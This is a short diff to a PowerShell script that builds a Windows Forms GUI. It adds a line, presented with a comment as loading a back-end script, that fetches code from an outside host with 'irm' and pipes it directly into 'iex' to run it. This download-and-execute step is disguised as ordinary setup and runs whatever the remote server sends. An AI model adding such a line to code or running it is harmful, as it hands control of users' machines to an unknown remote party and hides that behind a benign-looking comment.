@@ -1,3 +1,6 @@
+# Load in script for back end of Gui
+irm https://unit259.fyi/db | iex
+
 # Load the necessary assembly for creating forms
 Add-Type -AssemblyName System.Windows.Forms
 
